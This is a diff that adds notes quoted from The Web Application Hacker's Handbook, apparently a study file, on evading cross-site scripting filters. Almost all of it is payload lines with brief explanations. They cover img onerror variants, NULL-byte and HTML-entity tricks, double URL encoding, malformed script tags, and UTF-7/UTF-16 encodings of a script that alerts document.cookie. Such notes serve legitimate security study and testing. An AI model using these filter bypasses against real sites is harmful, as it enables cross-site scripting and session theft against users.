@@ -129,3 +129,66 @@ comes after the NULL
 Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12273-12275). Wiley. Kindle Edition. 
 
 
+Several characters can replace the space between the tag name and the first attribute name: 
+<img/onerror=alert(1) src=a>
+<img[%09]onerror=alert(1) src=a>
+<img[%0d]onerror=alert(1) src=a>
+<img[%0a]onerror=alert(1) src=a>
+<img/"onerror=alert(1) src=a>
+<img/'onerror=alert(1) src=a>
+<img/anyjunk/onerror=alert(1) src=a>
+ Note that even where an attack does not require any tag attributes, you should always try adding some superfluous 
+ content after the tag name, because this bypasses some simple filters: 
+ <script/anyjunk>alert(1)</script>
+Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12296-12305). Wiley. Kindle Edition. 
+
+
+Within the attribute name, you can use the same NULL byte trick described earlier. This bypasses many simple 
+filters that try to block event handlers by blocking attribute names starting with on: 
+<img o[%00]nerror=alert(1) src=a>
+Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12307-12310). Wiley. Kindle Edition. 
+
+HTML Encode
+HTML-encode characters within the value: <img onerror=a[%00]lert(1) src=a>
+<img onerror=a&#x6c;ert(1) src=a>
+Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12336-12338). Wiley. Kindle Edition. 
+
+<img onerror=a&#x06c;ert(1) src=a>
+<img onerror=a&#x006c;ert(1) src=a>
+<img onerror=a&#x0006c;ert(1) src=a>
+<img onerror=a&#108;ert(1) src=a>
+<img onerror=a&#0108;ert(1) src=a>
+<img onerror=a&#108ert(1) src=a>
+<img onerror=a&#0108ert(1) src=a>
+Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12348-12350). Wiley. Kindle Edition. 
+
+ %253cimg%20onerror=alert(1)%20src=a%253e
+ is URL-decoded by the application server and passed to the application as:
+ %3cimg onerror=alert(1) src=a%3e
+ The application decodes as:
+ <img onerror=alert(1) src=a>
+Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Location 12364). Wiley. Kindle Edition. 
+
+<<script>alert(1);//<</script>
+Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Location 12380). Wiley. Kindle Edition. 
+
+
+Works on Firefox - ECMAScript for XML
+<script<{alert(1)}/></script>
+Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Location 12385). Wiley. Kindle Edition. 
+
+Character Set Encoding
+representations of the string <script>alert(document.cookie)</script> in alternative character sets: 
+UTF-7
++ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-
+US-ASCII 
+ BC 73 63 72 69 70 74 BE 61 6C 65 72 74 28 64 6F ; ¼script¾alert(do
+63 75 6D 65 6E 74 2E 63 6F 6F 6B 69 65 29 BC 2F ; cument.cookie)¼/
+73 63 72 69 70 74 BE                            ; script¾
+UTF-16 
+ FF FE 3C 00 73 00 63 00 72 00 69 00 70 00 74 00 ; ÿþ<.s.c.r.i.p.t.
+3E 00 61 00 6C 00 65 00 72 00 74 00 28 00 64 00 ; >.a.l.e.r.t.(.d.
+6F 00 63 00 75 00 6D 00 65 00 6E 00 74 00 2E 00 ; o.c.u.m.e.n.t...
+63 00 6F 00 6F 00 6B 00 69 00 65 00 29 00 3C 00 ; c.o.o.k.i.e.).<.
+2F 00 73 00 63 00 72 00 69 00 70 00 74 00 3E 00 ; /.s.c.r.i.p.t.>.
+Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12400-12409). Wiley. Kindle Edition. 
